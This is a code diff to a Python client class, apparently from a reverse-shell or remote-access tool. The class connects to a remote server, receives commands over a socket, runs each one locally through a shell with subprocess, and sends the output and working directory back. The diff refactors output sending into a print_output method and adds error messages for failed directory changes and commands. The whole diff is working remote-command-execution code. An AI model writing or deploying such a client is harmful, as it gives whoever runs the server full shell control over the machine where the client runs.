@@ -36,40 +36,51 @@ class Client(object):
             raise
         return
 
+    def print_output(self, output_str):
+        """ Prints command output """
+        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
+        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
+        print(output_str)
+        return
+
     def receive_commands(self):
         """ Receive commands from remote server and run on local machine """
         try:
             self.socket.recv(10)
         except Exception as e:
-            print('Could not start communication with server: %s' %str(e))
+            print('Could not start communication with server: %s\n' %str(e))
             return
         cwd = str.encode(str(os.getcwd()) + '> ')
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
+            output_str = None
             data = self.socket.recv(20480)
             if data == b'': break
-            if data[:2].decode("utf-8") == 'cd':
+            elif data[:2].decode("utf-8") == 'cd':
+                directory = data[3:].decode("utf-8")
                 try:
-                    os.chdir(data[3:].decode("utf-8"))
-                except:
-                    pass
-            if data[:].decode("utf-8") == 'quit':
+                    os.chdir(directory.strip())
+                except Exception as e:
+                    output_str = "Could not change directory: %s\n" %str(e)
+                else: 
+                    output_str = ""
+            elif data[:].decode("utf-8") == 'quit':
                 self.socket.close()
                 break
-            if len(data) > 0:
+            elif len(data) > 0:
                 try:
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = output_bytes.decode("utf-8", errors="replace")
-                    sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
-                    self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
-                    print(output_str)
-                except:
+                except Exception as e:
                     # TODO: Error description is lost
-                    output_str = "Command not recognized" + "\n"
-                    self.socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                    print(output_str)
+                    output_str = "Command execution unsuccessful: %s\n" %str(e)
+            if output_str is not None:
+                try:
+                    self.print_output(output_str)
+                except Exception as e:
+                    print('Cannot send command output: %s' %str(e))
         self.socket.close()
         return
 
